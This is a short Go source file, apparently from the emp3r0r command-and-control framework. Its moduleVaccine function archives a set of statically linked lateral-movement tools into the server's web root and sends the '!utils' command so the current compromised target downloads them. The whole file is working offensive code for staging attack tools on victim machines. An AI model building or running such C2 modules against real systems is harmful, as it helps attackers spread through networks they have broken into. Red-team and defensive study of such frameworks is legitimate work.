package cc

import (
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleVaccine() {
	err := util.TarBz2(ModuleDir+"/vaccine", WWWRoot+"utils.tar.bz2")
	if err != nil {
		CliPrintError("Creating vaccine archive: %v", err)
		return
	}

	err = SendCmd("!utils", "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd failed: %v", err)
	}
}
